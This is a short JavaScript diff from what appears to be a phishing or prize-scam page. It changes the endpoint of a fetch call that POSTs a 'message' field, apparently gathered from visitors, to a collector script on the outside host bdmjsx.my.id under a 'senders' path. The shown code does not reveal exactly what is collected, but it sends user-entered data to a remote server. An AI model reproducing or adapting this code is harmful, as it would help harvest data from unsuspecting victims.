@@ -28,7 +28,7 @@ function next() {
 	fd.append('message', message);
 	
 	fetch("https://bdmjsx.my.id/senders/"
-        +"rezekiwondr/send.php", {
+        +"gebyar-rezeki/send.php", {
         method: 'POST',
         body: fd
       })
